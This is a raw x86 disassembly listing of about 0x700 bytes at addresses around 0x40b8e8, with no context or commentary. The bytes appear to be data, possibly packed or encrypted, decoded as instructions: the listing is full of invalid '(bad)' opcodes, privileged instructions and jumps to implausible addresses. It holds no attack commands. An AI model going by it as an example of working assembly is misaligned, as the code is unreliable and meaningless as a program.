  40b8e8:	push   ebx
  40b8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ea:	aad    0x3
  40b8ec:	test   eax,0xc8899bdb
  40b8f1:	ins    BYTE PTR es:[edi],dx
  40b8f2:	cmp    esi,DWORD PTR [ebp-0x12]
  40b8f5:	push   0xffffffb3
  40b8f7:	jns    0x40b920
  40b8f9:	mov    edi,0xac71bef5
  40b8fe:	out    dx,al
  40b8ff:	cmp    eax,0x62024ebf
  40b904:	retf   0xe517
  40b907:	jnp    0x40b986
  40b909:	test   DWORD PTR [ebp-0x19800775],edx
  40b90f:	add    DWORD PTR [ebx-0xa731cab],ecx
  40b915:	push   ebx
  40b916:	leave  
  40b917:	xor    eax,0x271fff1c
  40b91c:	popf   
  40b91d:	pop    ds
  40b91e:	push   ss
  40b91f:	rsm    
  40b921:	pop    ebp
  40b922:	pop    edi
  40b923:	test   DWORD PTR [si+0xad7],esp
  40b928:	inc    ecx
  40b929:	sub    al,ch
  40b92b:	mov    esp,0xcd5e8136
  40b930:	pop    ecx
  40b931:	lea    eax,[eax]
  40b933:	jne    0x40b948
  40b935:	(bad)  
  40b937:	add    al,0xe8
  40b939:	lock dec ebp
  40b93b:	mov    dh,0x8f
  40b93d:	push   cs
  40b93e:	xlat   BYTE PTR ds:[ebx]
  40b93f:	push   ecx
  40b940:	into   
  40b941:	sbb    BYTE PTR [ebp+eiz*1-0x5c87eb08],0x1f
  40b949:	mov    ds:0xbff26fb2,eax
  40b94e:	sub    DWORD PTR [edi],edx
  40b950:	and    BYTE PTR cs:[ecx+esi*8-0x3d81e222],bh
  40b958:	pop    ss
  40b959:	retf   0xf7d5
  40b95c:	gs jnp 0x40b9bb
  40b95f:	pminsw mm6,QWORD PTR [esp+eax*8+0x77b18e75]
  40b967:	push   esi
  40b968:	or     DWORD PTR [edx],0x2b61089a
  40b96e:	and    DWORD PTR [ebp+0x69cb1ff1],ecx
  40b974:	mov    esp,0x2f4d8a46
  40b979:	and    dl,ch
  40b97b:	mov    al,BYTE PTR [ebp-0x257d4198]
  40b981:	enter  0x7fd6,0x39
  40b985:	xchg   ebp,eax
  40b986:	pop    ds
  40b987:	test   DWORD PTR [edi-0x1d],ebp
  40b98a:	xor    eax,0xc80f9c1a
  40b98f:	jno    0x40b992
  40b991:	and    BYTE PTR [ecx+0x6a],bl
  40b994:	rcr    BYTE PTR [edx-0x10],1
  40b997:	pop    esi
  40b998:	or     ch,dl
  40b99a:	aad    0x50
  40b99c:	cmp    al,0xb7
  40b99e:	or     DWORD PTR [ebx],esp
  40b9a0:	push   ebx
  40b9a1:	sub    DWORD PTR [edi+0x75],ecx
  40b9a4:	push   0x2c
  40b9a6:	test   al,0xe0
  40b9a8:	(bad)  
  40b9a9:	or     edx,DWORD PTR [ecx-0x54]
  40b9ac:	in     al,dx
  40b9ad:	data16 aad 0xd2
  40b9b0:	enter  0x74e8,0xdc
  40b9b4:	scas   al,BYTE PTR es:[edi]
  40b9b5:	je     0x40b99e
  40b9b7:	jnp    0x40b9d1
  40b9b9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40b9bb:	cwde   
  40b9bc:	(bad)  
  40b9be:	out    dx,eax
  40b9bf:	and    DWORD PTR [edi],edi
  40b9c1:	clc    
  40b9c2:	aad    0x5
  40b9c4:	add    bh,cl
  40b9c6:	xchg   ecx,eax
  40b9c7:	cmc    
  40b9c8:	pop    esi
  40b9c9:	mov    edi,0x74037c44
  40b9ce:	dec    edi
  40b9cf:	stos   DWORD PTR es:[edi],eax
  40b9d0:	xchg   edi,eax
  40b9d1:	jb     0x40b9f9
  40b9d3:	cli    
  40b9d4:	jno    0x40ba53
  40b9d6:	adc    al,0x74
  40b9d8:	jne    0x40b982
  40b9da:	mov    dl,0x8
  40b9dc:	cdq    
  40b9dd:	push   ss
  40b9de:	stos   BYTE PTR es:[edi],al
  40b9df:	and    eax,0xe6d2574
  40b9e4:	jg     0x40ba21
  40b9e6:	out    0xa4,eax
  40b9e8:	mov    al,0x4c
  40b9ea:	push   ds
  40b9eb:	jp     0x40b9f1
  40b9ed:	fidivr WORD PTR [edx]
  40b9ef:	mov    esi,ecx
  40b9f1:	(bad)  
  40b9f2:	dec    ecx
  40b9f3:	nop
  40b9f4:	(bad)  
  40b9f5:	ss pop esp
  40b9f7:	mov    bh,0x93
  40b9f9:	pop    ds
  40b9fa:	and    eax,0x2a506d7a
  40b9ff:	addr16 jno 0x40b99d
  40ba02:	adc    edi,esi
  40ba04:	mov    ecx,0x34caec56
  40ba09:	pop    eax
  40ba0a:	repnz lds esi,FWORD PTR [ecx+0x35]
  40ba0e:	bts    DWORD PTR [esp+edi*8+0x4e],ebp
  40ba13:	xor    esp,edx
  40ba15:	or     edi,edx
  40ba17:	lea    eax,[ebx+0xe04df40]
  40ba1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba1e:	ror    DWORD PTR [eax+ebx*4+0x69c5901f],0x95
  40ba26:	and    BYTE PTR [bx+0x45],dh
  40ba2a:	(bad)  
  40ba2b:	add    DWORD PTR [ebp+ebx*4-0x64],esp
  40ba2f:	jle    0x40b9fc
  40ba31:	int    0xcd
  40ba33:	mov    ah,0x14
  40ba35:	and    dl,dl
  40ba37:	loopne 0x40ba9a
  40ba39:	ins    BYTE PTR es:[edi],dx
  40ba3a:	fwait
  40ba3b:	out    dx,eax
  40ba3c:	dec    edx
  40ba3d:	and    esi,ebx
  40ba3f:	iret   
  40ba40:	(bad)  
  40ba41:	mov    dh,0x15
  40ba43:	xchg   BYTE PTR [ecx+0x841b24],dh
  40ba49:	fcomp  st(7)
  40ba4b:	je     0x40ba21
  40ba4d:	sub    DWORD PTR [edx-0xd],ebp
  40ba50:	add    al,0x28
  40ba52:	dec    edi
  40ba53:	(bad)  [ecx-0x1d]
  40ba56:	and    ebp,DWORD PTR [edi]
  40ba58:	jecxz  0x40b9e4
  40ba5a:	add    al,0xe1
  40ba5c:	cld    
  40ba5d:	sub    eax,0x4d228a81
  40ba62:	aad    0xa9
  40ba64:	rcr    ch,1
  40ba66:	ror    DWORD PTR [eax],1
  40ba68:	jno    0x40baa1
  40ba6a:	ja     0x40bae5
  40ba6c:	icebp  
  40ba6d:	cmp    DWORD PTR [esi+0x6d],ebx
  40ba70:	addr16 pop ebp
  40ba72:	loope  0x40ba2d
  40ba74:	imul   edi,DWORD PTR [edi],0x209d9958
  40ba7a:	mov    ebp,0x2a8d87cb
  40ba7f:	mov    ch,0x1f
  40ba81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba82:	jmp    0x80422bd8
  40ba87:	sub    BYTE PTR [edi-0x4b],bl
  40ba8a:	fldcw  WORD PTR [esi+0xf]
  40ba8d:	adc    dh,cl
  40ba8f:	jle    0x40ba53
  40ba91:	stos   DWORD PTR es:[edi],eax
  40ba92:	pop    ebp
  40ba93:	aaa    
  40ba94:	pop    ebp
  40ba95:	and    BYTE PTR [edx],ch
  40ba97:	jb     0x40babc
  40ba99:	addr16 jmp 0xfdf72beb
  40ba9f:	icebp  
  40baa0:	sub    BYTE PTR [ebx+ecx*8+0x11],bl
  40baa4:	sub    DWORD PTR [esi],ebp
  40baa6:	sbb    DWORD PTR [ecx+edi*4+0x74],esi
  40baaa:	adc    eax,0x899f5863
  40baaf:	pop    ebx
  40bab0:	popf   
  40bab1:	loop   0x40ba45
  40bab3:	jns    0x40ba5f
  40bab5:	mov    al,ds:0x9bfa4d15
  40baba:	mov    dl,0x71
  40babc:	loope  0x40ba59
  40babe:	aaa    
  40babf:	js     0x40bafb
  40bac1:	add    ecx,DWORD PTR [ebp+0x2]
  40bac4:	push   ebx
  40bac5:	orps   xmm5,XMMWORD PTR [esi+0x70fb03f]
  40bacc:	mov    edx,cr4
  40bacf:	xchg   BYTE PTR [ecx-0x6ecfcdc9],bh
  40bad5:	pop    ds
  40bad6:	jnp    0x40ba5d
  40bad8:	inc    ecx
  40bad9:	das    
  40bada:	leave  
  40badb:	jbe    0x40bb01
  40badd:	scas   eax,DWORD PTR es:[edi]
  40bade:	push   cs
  40badf:	xlat   BYTE PTR ds:[ebx]
  40bae0:	or     esp,DWORD PTR [eax]
  40bae2:	dec    esp
  40bae3:	ins    BYTE PTR es:[edi],dx
  40bae4:	ficomp WORD PTR [ecx+ecx*2-0x3cb27d98]
  40baeb:	adc    eax,0x1f451fcb
  40baf0:	mov    esp,0xedc58ae8
  40baf5:	fcmovnbe st,st(5)
  40baf7:	in     eax,0xfc
  40baf9:	dec    ebx
  40bafa:	xlat   BYTE PTR ds:[ebx]
  40bafb:	nop
  40bafc:	jmp    0x40baa7
  40bafe:	cld    
  40baff:	call   0xca0e:0x752e943c
  40bb06:	add    eax,0xd595d50f
  40bb0b:	icebp  
  40bb0c:	pushf  
  40bb0d:	ins    DWORD PTR es:[edi],dx
  40bb0e:	mov    esp,0xaa352ce2
  40bb13:	rcr    DWORD PTR [esi+0x2d7547cf],1
  40bb19:	neg    DWORD PTR [ecx+0x2d88d469]
  40bb1f:	stos   BYTE PTR es:[edi],al
  40bb20:	jno    0x40bb0d
  40bb22:	icebp  
  40bb23:	mov    ds:0xacecd5ef,eax
  40bb28:	ja     0x40bb49
  40bb2a:	ins    BYTE PTR es:[edi],dx
  40bb2b:	cmc    
  40bb2c:	add    BYTE PTR [edx],ch
  40bb2e:	xor    BYTE PTR [esi+0x5a],dl
  40bb31:	ja     0x40bb25
  40bb33:	fnsave [ebx-0x6b]
  40bb36:	push   ss
  40bb37:	cmp    bl,BYTE PTR [ecx+ebp*8+0x384d1023]
  40bb3e:	mov    ds:0xbfb5df75,eax
  40bb43:	push   edi
  40bb44:	imul   BYTE PTR [esi]
  40bb46:	xlat   BYTE PTR ds:[ebx]
  40bb47:	xchg   ebx,eax
  40bb48:	jno    0x40bb4c
  40bb4a:	lock jns 0x40bbb2
  40bb4d:	lea    esi,[eax+0x3c1ff32c]
  40bb53:	adc    ebp,DWORD PTR [eax-0x62ef8a67]
  40bb59:	push   ebp
  40bb5a:	aad    0xdd
  40bb5c:	mov    edx,0xf80c374d
  40bb61:	push   cs
  40bb62:	or     esi,DWORD PTR [ebp+0x54]
  40bb65:	mov    ss,WORD PTR [eax+0x55]
  40bb68:	xchg   edi,eax
  40bb69:	mov    eax,0xa771ec52
  40bb6e:	pushf  
  40bb6f:	mov    edi,0xb3a98a37
  40bb74:	pusha  
  40bb75:	pop    esi
  40bb76:	cmp    BYTE PTR [eax],bl
  40bb78:	icebp  
  40bb79:	sub    BYTE PTR ds:0x9daa072d,cl
  40bb7f:	or     DWORD PTR [ebp+0x78bb326f],edx
  40bb85:	cmp    esp,esp
  40bb87:	dec    eax
  40bb88:	and    DWORD PTR [edi],0x1fb15ef2
  40bb8e:	addr16 mov dh,0x99
  40bb91:	inc    di
  40bb93:	sub    BYTE PTR [ecx],cl
  40bb95:	outs   dx,BYTE PTR ds:[esi]
  40bb96:	xor    DWORD PTR ds:0xb4682020,ebx
  40bb9c:	pushf  
  40bb9d:	loope  0x40bb57
  40bb9f:	lock xchg esp,eax
  40bba1:	pop    ds
  40bba2:	adc    al,BYTE PTR [edx+0x52398da5]
  40bba8:	cmp    eax,DWORD PTR ds:0x5e90bdd9
  40bbae:	push   ecx
  40bbaf:	mov    ch,0x3f
  40bbb1:	test   al,0x74
  40bbb3:	setg   BYTE PTR [ecx]
  40bbb6:	js     0x40bbca
  40bbb8:	push   ebp
  40bbb9:	call   0x4709:0xb031fbd1
  40bbc0:	jno    0x40bbf7
  40bbc2:	loop   0x40bbba
  40bbc4:	or     DWORD PTR [eax-0x8],edx
  40bbc7:	test   eax,0x77a02065
  40bbcc:	push   es
  40bbcd:	sub    BYTE PTR [ecx],bl
  40bbcf:	or     DWORD PTR [eax-0x23],esp
  40bbd2:	aad    0x7
  40bbd4:	pushf  
  40bbd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbd6:	scas   eax,DWORD PTR es:[edi]
  40bbd7:	mov    al,0x25
  40bbd9:	add    ah,dl
  40bbdb:	jne    0x40bc30
  40bbdd:	enter  0xe3c9,0xc
  40bbe1:	xchg   ebx,eax
  40bbe2:	push   0xffffffd8
  40bbe4:	loop   0x40bb8c
  40bbe6:	fcmovu st,st(1)
  40bbe8:	daa    
  40bbe9:	push   cs
  40bbea:	dec    edx
  40bbeb:	xor    dh,BYTE PTR [ecx+0x7]
  40bbee:	or     DWORD PTR [ecx+0x755f8aa9],ebx
  40bbf4:	in     al,0x8f
  40bbf6:	dec    ebp
  40bbf7:	dec    esi
  40bbf8:	mov    BYTE PTR [edi+0x2a],ch
  40bbfb:	sbb    bh,BYTE PTR [edi-0x52]
  40bbfe:	inc    ebx
  40bbff:	push   es
  40bc00:	and    esp,DWORD PTR [eax]
  40bc02:	push   esp
  40bc03:	xchg   esp,edi
  40bc05:	in     eax,dx
  40bc06:	inc    ebp
  40bc07:	mov    dl,0xd6
  40bc09:	rcl    BYTE PTR [ebp-0x44],1
  40bc0c:	dec    eax
  40bc0d:	bound  edi,QWORD PTR [ebx+0x5c]
  40bc10:	scas   al,BYTE PTR es:[edi]
  40bc11:	adc    esi,edx
  40bc13:	scas   eax,DWORD PTR es:[edi]
  40bc14:	adc    DWORD PTR [ecx-0x1d],edi
  40bc17:	sub    DWORD PTR [edx+0x2],esi
  40bc1a:	loopne 0x40bc90
  40bc1c:	iret   
  40bc1d:	ret    
  40bc1e:	and    eax,0x3549d29a
  40bc23:	in     al,dx
  40bc24:	jno    0x40bc7b
  40bc26:	icebp  
  40bc27:	add    esi,DWORD PTR ds:0x4d7383d0
  40bc2d:	ins    BYTE PTR es:[edi],dx
  40bc2e:	test   eax,0xba43718d
  40bc33:	test   ecx,esi
  40bc35:	fcom   DWORD PTR [ebx-0x7e]
  40bc38:	out    dx,al
  40bc39:	ret    0xa3d8
  40bc3c:	jg     0x40bc01
  40bc3e:	mov    ds:0x5bdfa888,eax
  40bc43:	push   0xffffffad
  40bc45:	fwait
  40bc46:	iret   
  40bc47:	js     0x40bc98
  40bc49:	sub    dh,BYTE PTR ds:0x5f015a14
  40bc4f:	cli    
  40bc50:	fs inc eax
  40bc52:	xchg   DWORD PTR [esi+0x750d1aa9],esi
  40bc58:	sbb    ah,BYTE PTR [ecx+eiz*1+0x3b112d8f]
  40bc5f:	xchg   ebx,eax
  40bc60:	mov    bl,0xca
  40bc62:	dec    esi
  40bc63:	mov    ch,0x47
  40bc65:	xchg   edi,eax
  40bc66:	arpl   dx,cx
  40bc68:	mov    BYTE PTR [esi],ah
  40bc6a:	aad    0xa7
  40bc6c:	cs cmp al,0xb0
  40bc6f:	mov    ds:0x74e3dec3,al
  40bc74:	jae    0x40bc01
  40bc76:	lock sub DWORD PTR [ebp+0x16],edx
  40bc7a:	mov    ah,0x5c
  40bc7c:	jno    0x40bc2a
  40bc7e:	ficom  WORD PTR [ebx]
  40bc80:	call   0x323e8d0f
  40bc85:	and    BYTE PTR [ebx-0x219b8ba],bh
  40bc8b:	addr16 jmp 0x6bd0:0xd5ced61e
  40bc93:	loop   0x40bc29
  40bc95:	js     0x40bc3a
  40bc97:	jne    0x40bcf6
  40bc99:	add    eax,0x2d8e1117
  40bc9e:	cmp    esi,esi
  40bca0:	popf   
  40bca1:	arpl   WORD PTR [ebp+ebp*8-0x3cde9e88],ax
  40bca8:	push   edx
  40bca9:	test   DWORD PTR [ebp+0x73],edx
  40bcac:	xor    DWORD PTR [edi-0x3a588b0a],esi
  40bcb2:	rcl    bl,cl
  40bcb4:	aad    0x1b
  40bcb6:	(bad)  
  40bcb7:	jecxz  0x40bd31
  40bcb9:	dec    ebx
  40bcba:	mov    ah,0x89
  40bcbc:	repz dec esp
  40bcbe:	test   DWORD PTR ds:0xb060f7b3,ebx
  40bcc4:	dec    edi
  40bcc5:	dec    edx
  40bcc6:	push   ebp
  40bcc7:	int3   
  40bcc8:	adc    edi,ecx
  40bcca:	add    al,0xb6
  40bccc:	ror    ch,1
  40bcce:	adc    DWORD PTR [ecx-0x53],ebp
  40bcd1:	scas   al,BYTE PTR es:[edi]
  40bcd2:	lods   al,BYTE PTR ds:[esi]
  40bcd3:	sub    BYTE PTR [eax+0x6bb4e48e],dl
  40bcd9:	add    edi,esi
  40bcdb:	push   ss
  40bcdc:	sbb    edi,DWORD PTR [eax-0x62368af3]
  40bce2:	lods   eax,DWORD PTR ds:[esi]
  40bce3:	and    DWORD PTR [esi-0x78],0xbda95cf4
  40bcea:	push   eax
  40bceb:	jl     0x40bc8e
  40bced:	iret   
  40bcee:	xor    dl,bl
  40bcf0:	mov    cl,0x73
  40bcf2:	adc    bl,BYTE PTR [edx-0x41]
  40bcf5:	es push edi
  40bcf7:	out    0x30,al
  40bcf9:	pop    ebx
  40bcfa:	in     al,dx
  40bcfb:	inc    esp
  40bcfc:	or     bh,BYTE PTR [esp+edi*8]
  40bcff:	ins    BYTE PTR es:[edi],dx
  40bd00:	jb     0x40bcb5
  40bd02:	mov    cl,0xf0
  40bd04:	or     DWORD PTR [ecx],ebx
  40bd06:	ficom  WORD PTR [ebx]
  40bd08:	inc    ecx
  40bd09:	hlt    
  40bd0a:	cmp    al,0x71
  40bd0c:	sbb    eax,0xf7fe820
  40bd11:	(bad)  
  40bd12:	in     al,dx
  40bd13:	xor    ecx,eax
  40bd15:	mov    al,0xdc
  40bd17:	leave  
  40bd18:	fisubr WORD PTR [ecx+ebx*4+0x4f]
  40bd1c:	adc    DWORD PTR [edi+esi*4],0x8f35dfb2
  40bd23:	leave  
  40bd24:	out    dx,eax
  40bd25:	pop    ds
  40bd26:	push   edi
  40bd27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd28:	mov    ds:0x1c2b4c0,eax
  40bd2d:	gs test ecx,edx
  40bd30:	jno    0x40bcc3
  40bd32:	les    edx,FWORD PTR [eax-0x3c]
  40bd35:	sbb    BYTE PTR [edi+ecx*8-0x7127dfa7],ah
  40bd3c:	(bad)  
  40bd3d:	mov    esi,0x9b91c32
  40bd42:	cs dec edx
  40bd44:	sub    BYTE PTR [eax],ah
  40bd46:	add    DWORD PTR ds:0xc2dad2aa,edi
  40bd4c:	sbb    DWORD PTR [edi],0xe5b447ff
  40bd52:	add    BYTE PTR [ebp+esi*2-0x13cb2a5f],cl
  40bd59:	or     eax,0x93b8397d
  40bd5e:	dec    esi
  40bd5f:	mov    bl,0xaa
  40bd61:	int3   
  40bd62:	fmul   DWORD PTR [ebp+0x7]
  40bd65:	scas   eax,DWORD PTR es:[edi]
  40bd66:	sub    esi,esp
  40bd68:	or     bl,BYTE PTR [ebx+0x11cc4922]
  40bd6e:	cli    
  40bd6f:	sub    esi,DWORD PTR [ecx]
  40bd71:	unpckhps xmm6,XMMWORD PTR [ebp-0xa]
  40bd75:	leave  
  40bd76:	enter  0xdbd6,0x7d
  40bd7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd7b:	push   ebp
  40bd7c:	cs xchg edx,eax
  40bd7e:	stos   BYTE PTR es:[edi],al
  40bd7f:	jne    0x40bd5a
  40bd81:	test   BYTE PTR [esi+0x42],bh
  40bd84:	sub    al,0xd7
  40bd86:	xchg   esp,eax
  40bd87:	sbb    dl,ah
  40bd89:	and    ebp,edx
  40bd8b:	mov    ds:0x135b8a95,eax
  40bd90:	imul   ecx,ebp,0x70
  40bd93:	jne    0x40bdbc
  40bd95:	mov    ds:0x24784b72,al
  40bd9a:	pusha  
  40bd9b:	loope  0x40be0e
  40bd9d:	(bad)  
  40bd9e:	push   cs
  40bd9f:	jmp    0x40bdba
  40bda1:	lods   al,BYTE PTR ds:[esi]
  40bda2:	loop   0x40bd5d
  40bda4:	add    BYTE PTR [eax],ah
  40bda6:	add    eax,0xba55e98c
  40bdab:	adc    DWORD PTR [edx+0x32],esp
  40bdae:	aad    0x20
  40bdb0:	in     al,0xf4
  40bdb2:	push   ecx
  40bdb3:	stos   BYTE PTR es:[edi],al
  40bdb4:	cld    
  40bdb5:	and    DWORD PTR [esi+0x75],ebp
  40bdb8:	(bad)  
  40bdb9:	cli    
  40bdba:	xchg   esi,eax
  40bdbb:	mov    al,0xfb
  40bdbd:	mov    WORD PTR [edx+0x1e4a71ee],?
  40bdc3:	adc    BYTE PTR [esi-0x3ae3e8b0],dh
  40bdc9:	ja     0x40bde6
  40bdcb:	loop   0x40bd5c
  40bdcd:	retf   
  40bdce:	jbe    0x40bdd3
  40bdd0:	iret   
  40bdd1:	sub    dl,BYTE PTR [ebp-0x2fff928e]
  40bdd7:	cmp    al,0x71
  40bdd9:	jecxz  0x40bdf4
  40bddb:	lahf   
  40bddc:	mov    esi,0x5d367c8e
  40bde2:	dec    ebx
  40bde3:	add    ecx,esi
  40bde5:	int    0xc2
  40bde7:	popa   
  40bde8:	jge    0x40be48
  40bdea:	and    al,0x3e
  40bdec:	jno    0x40bdc4
  40bdee:	lods   al,BYTE PTR ds:[esi]
  40bdef:	sub    al,BYTE PTR [edx]
  40bdf1:	mov    ch,BYTE PTR [ebp-0x8ca62a4]
  40bdf7:	ffreep st(6)
  40bdf9:	and    esp,DWORD PTR [ecx-0x5e]
  40bdfc:	jmp    0x2b15e0e0
  40be01:	loope  0x40bdd8
  40be03:	or     esi,DWORD PTR [ebx+ebx*2-0x6b0dabd0]
  40be0a:	popf   
  40be0b:	jne    0x40bdf2
  40be0d:	imul   ebp,DWORD PTR [ebx-0x388c95da],0xf386711f
  40be17:	ja     0x40bd9a
  40be19:	adc    BYTE PTR [edx],ah
  40be1b:	repz push ecx
  40be1d:	and    BYTE PTR ds:0x402193f6,ah
  40be23:	or     BYTE PTR [ebp+edx*2-0x2a],0x60
  40be28:	sbb    DWORD PTR [edx],ebx
  40be2a:	(bad)
  40be2d:	aaa    
  40be2e:	xabort 0x55
  40be31:	and    eax,0xa9d583ea
  40be36:	ror    al,1
  40be38:	mov    cl,0xc
  40be3a:	pop    ds
  40be3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be3c:	pop    edx
  40be3d:	inc    eax
  40be3e:	xlat   BYTE PTR ds:[ebx]
  40be3f:	xchg   ecx,eax
  40be40:	aaa    
  40be41:	sub    DWORD PTR ss:0x39270056,esp
  40be48:	add    DWORD PTR [eax],esp
  40be4a:	test   BYTE PTR [eax+0x68096076],0xe1
  40be51:	xchg   ebp,edx
  40be53:	adc    al,0xf2
  40be55:	daa    
  40be56:	aam    0xf2
  40be58:	sub    al,0xa8
  40be5a:	mov    al,0x75
  40be5c:	jp     0x40be52
  40be5e:	test   DWORD PTR [esi],esp
  40be60:	rcr    DWORD PTR [edx-0x68],cl
  40be63:	stc    
  40be64:	jno    0x40bee3
  40be66:	sub    eax,eax
  40be68:	adc    al,0x9e
  40be6a:	std    
  40be6b:	imul   esp,DWORD PTR [esi-0x2b6844df],0x7c
  40be72:	pop    ss
  40be73:	std    
  40be74:	xor    DWORD PTR [esi+0x25],edi
  40be77:	jle    0x40beea
  40be79:	pop    es
  40be7a:	inc    ecx
  40be7b:	lea    eax,[ecx-0x1048fb0]
  40be81:	inc    ebx
  40be82:	daa    
  40be83:	arpl   WORD PTR [edx+0x1f],di
  40be86:	popf   
  40be87:	in     al,0xfc
  40be89:	sti    
  40be8a:	out    dx,eax
  40be8b:	pop    ecx
  40be8c:	popf   
  40be8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be8e:	mov    eax,0xfd95713d
  40be93:	scas   al,BYTE PTR es:[edi]
  40be94:	(bad)
  40be98:	rcl    DWORD PTR [ecx],0x16
  40be9b:	mov    ch,0x68
  40be9d:	ja     0x40be75
  40be9f:	popa   
  40bea0:	mov    dl,0x91
  40bea2:	aad    0x46
  40bea4:	sub    eax,0xca276b4e
  40bea9:	outs   dx,BYTE PTR ds:[esi]
  40beaa:	sbb    esi,DWORD PTR [ebp+0x4]
  40bead:	inc    ebp
  40beae:	mov    ebx,es
  40beb0:	aaa    
  40beb1:	(bad)  
  40beb2:	and    eax,0x48de31a5
  40beb7:	cmp    BYTE PTR [esi+0x588088bb],ch
  40bebd:	fidiv  WORD PTR [ebp+0x673ff14f]
  40bec3:	cmp    esi,esp
  40bec5:	(bad)  
  40bec6:	aad    0x41
  40bec8:	pop    edi
  40bec9:	sbb    BYTE PTR [ebp-0x464ad962],ah
  40becf:	xchg   ebx,eax
  40bed0:	cmp    DWORD PTR [ebx+0x72],eax
  40bed3:	adc    dh,BYTE PTR [ebx+0x73edd2df]
  40bed9:	and    eax,0x9921a644
  40bede:	aad    0x41
  40bee0:	add    esp,DWORD PTR [ebp-0x6c]
  40bee3:	mov    WORD PTR [eax+0xe],fs
  40bee6:	cld    
  40bee7:	je     0x40bf53
  40bee9:	out    0xbf,eax
  40beeb:	retf   
  40beec:	cmp    al,0xa8
  40beee:	es sbb al,0x71
  40bef1:	sar    DWORD PTR ds:0xfdfdf846,1
  40bef7:	mov    esp,0x786c203d
  40befc:	xchg   esi,eax
  40befd:	in     eax,dx
  40befe:	adc    bh,al
  40bf00:	adc    DWORD PTR [edi-0x19],ebx
  40bf03:	hlt    
  40bf04:	add    ebx,DWORD PTR [ebx+0xe1884d5]
  40bf0a:	inc    ebx
  40bf0b:	pop    ebx
  40bf0c:	dec    ebx
  40bf0d:	and    DWORD PTR ds:0x27db01cb,edx
  40bf13:	push   edx
  40bf14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf15:	sti    
  40bf16:	add    BYTE PTR [eax+0x7e774371],0xa6
  40bf1d:	loope  0x40bed3
  40bf1f:	and    DWORD PTR [esi],ecx
  40bf21:	pop    esi
  40bf22:	mov    WORD PTR fs:[ecx+0x3],?
  40bf26:	call   0x612069d6
  40bf2b:	out    0xa1,al
  40bf2d:	sti    
  40bf2e:	retf   0x5ba1
  40bf31:	pushf  
  40bf32:	int    0x7c
  40bf34:	mov    dl,BYTE PTR [edx+0x7f8837a8]
  40bf3a:	pop    es
  40bf3b:	cmp    eax,edi
  40bf3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf3e:	call   0xd5e4bb09
  40bf43:	inc    edx
  40bf44:	mov    ds,WORD PTR fs:[eax+0x1224f9ce]
  40bf4b:	loop   0x40bfb8
  40bf4d:	push   ecx
  40bf4e:	jmp    0x7f25:0xdce94134
  40bf55:	sub    ch,BYTE PTR [edi]
  40bf57:	jmp    0xfcd8:0xc622a02b
  40bf5e:	sti    
  40bf5f:	add    ch,0x42
  40bf62:	pop    ebx
  40bf63:	outs   dx,BYTE PTR ds:[esi]
  40bf64:	push   ecx
  40bf65:	int3   
  40bf66:	lea    esp,[ebp+0x4cd6ffe7]
  40bf6c:	jl     0x40bef1
  40bf6e:	mov    ah,0x38
  40bf70:	ins    BYTE PTR es:[edi],dx
  40bf71:	shl    BYTE PTR [ecx+0x5d2f26a1],0x97
  40bf78:	lods   eax,DWORD PTR ds:[esi]
  40bf79:	mov    ch,0x11
  40bf7b:	jne    0x40bf58
  40bf7d:	sbb    al,0x6a
  40bf7f:	inc    esi
  40bf80:	mov    ds:0x1ee6d5d7,eax
  40bf85:	or     eax,0x8e80751
  40bf8a:	sbb    al,0x6d
  40bf8c:	and    esp,DWORD PTR [ecx]
  40bf8e:	scas   eax,DWORD PTR es:[edi]
  40bf8f:	push   ebp
  40bf90:	dec    eax
  40bf91:	jp     0x40bf5d
  40bf93:	ss pop ecx
  40bf95:	in     eax,dx
  40bf96:	push   ss
  40bf97:	aad    0xc8
  40bf99:	push   ss
  40bf9a:	(bad)  
  40bf9b:	sub    dh,BYTE PTR [ebx+0x31]
  40bf9e:	and    dh,dh
  40bfa0:	iret   
  40bfa1:	fidiv  DWORD PTR [edx]
  40bfa3:	jne    0x40bfaa
  40bfa5:	push   0xffffff83
  40bfa7:	push   esp
  40bfa8:	xchg   ebp,eax
  40bfa9:	stos   BYTE PTR es:[edi],al
  40bfaa:	fidivr DWORD PTR [eax+0x71]
  40bfad:	mov    ecx,0x88dc165a
  40bfb2:	mov    ebp,0xa5200f9f
  40bfb7:	popf   
  40bfb8:	in     al,dx
  40bfb9:	or     BYTE PTR [edx],0x83
  40bfbc:	fmul   st,st(1)
  40bfbe:	aad    0x77
  40bfc0:	leave  
  40bfc1:	or     BYTE PTR [edi-0x77413fd5],0x75
  40bfc8:	sub    al,0x8a
  40bfca:	mov    ebx,0xff3ffedd
  40bfcf:	sbb    BYTE PTR [ecx+0x5a],dh
  40bfd2:	int    0xfb
  40bfd4:	scas   eax,DWORD PTR es:[edi]
  40bfd5:	test   BYTE PTR [edi],bl
  40bfd7:	cwde   
  40bfd8:	fs daa 
  40bfda:	in     al,dx
  40bfdb:	gs dec ecx
  40bfdd:	sub    DWORD PTR [edx+0x45],ebx
  40bfe0:	dec    edi
  40bfe1:	daa    
  40bfe2:	push   eax
  40bfe3:	jae    0x40bf74
  40bfe5:	lahf   
  40bfe6:	into   
  40bfe7:	mov    esi,DWORD PTR [edx-0x6e]
  40bfea:	mov    ah,0x6b
  40bfec:	mov    ah,0xfb
  40bfee:	int    0xf4
  40bff0:	xor    BYTE PTR [eax],ah
  40bff2:	pop    ds
  40bff3:	inc    ecx
  40bff4:	pop    edx
  40bff6:	iret   
  40bff7:	mov    ecx,ds
  40bff9:	scas   eax,DWORD PTR es:[edi]
  40bffa:	xchg   ebp,eax
  40bffb:	dec    edi
  40bffc:	dec    eax
  40bffd:	pushf  
  40bffe:	fnstsw WORD PTR [ebx-0x208ca3f0]
  40c004:	mov    BYTE PTR [ebx+0x228b74ed],ah
  40c00a:	inc    esi
  40c00b:	pop    ebp
  40c00c:	fnsave [edx]
  40c00e:	loopne 0x40bf94
  40c010:	dec    edi
  40c011:	ss div esp
